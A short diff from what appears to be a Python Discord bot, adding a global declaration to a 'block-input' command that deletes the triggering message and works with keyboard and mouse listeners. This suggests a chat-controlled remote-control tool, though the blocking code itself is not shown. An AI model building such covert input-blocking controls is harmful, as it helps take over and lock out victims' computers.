@@ -6,7 +6,8 @@ mouse_listener = None
 
 @client.command(name="block-input")
 async def block_input(ctx):
-
+    global input_blocked, keyboard_listener, mouse_listener
+    
     if not input_blocked:
         await ctx.message.delete()
 
